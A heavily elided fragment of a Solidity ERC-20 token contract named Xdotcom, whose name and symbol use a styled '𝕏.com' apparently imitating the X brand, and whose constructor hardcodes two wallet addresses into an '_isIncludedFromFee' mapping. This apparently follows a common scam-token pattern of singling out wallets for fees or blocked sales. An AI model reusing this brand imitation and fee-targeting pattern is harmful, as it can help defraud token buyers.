...
contract Xdotcom is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"𝕏.com";
    string private constant _symbol = unicode"$𝕏.com";
    ...
    constructor () {
        ...
        _isIncludedFromFee[0xE49b818b6e2C39A45e4141D036a8D79DEbf9D2c8] = true;
        _isIncludedFromFee[0xf9bD285d424977b85d934ce79c237551650dcCdE] = true;
